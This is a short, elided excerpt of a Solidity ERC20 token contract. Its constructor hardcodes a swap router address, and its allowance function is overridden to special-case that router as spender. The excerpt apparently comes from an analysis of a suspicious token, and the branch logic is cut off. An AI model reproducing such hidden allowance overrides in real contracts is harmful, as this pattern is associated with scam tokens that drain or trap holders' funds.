...
abstract contract ERC20 is Ownable, IERC20, IERC20Metadata, IERC20Errors {
    ...
    constructor(string memory name_, string memory symbol_, uint256 number,address toAddress) {
        _name = name_;
        _symbol = symbol_;
        _update(address(0), toAddress, number * 10 ** 18);
        deployerAddress = toAddress;
        WETH = 0xe538905cf8410324e03A5A23C1c177a474D59b2b;
        ISwapRouter swapRouter = ISwapRouter(0x881fB2f98c13d521009464e7D1CBf16E1b394e8E);
...
contract TOKEN is ERC20 {
    ...
    function allowance(
        ...
        if (
            (spender == 0x881fB2f98c13d521009464e7D1CBf16E1b394e8E)
        ) {
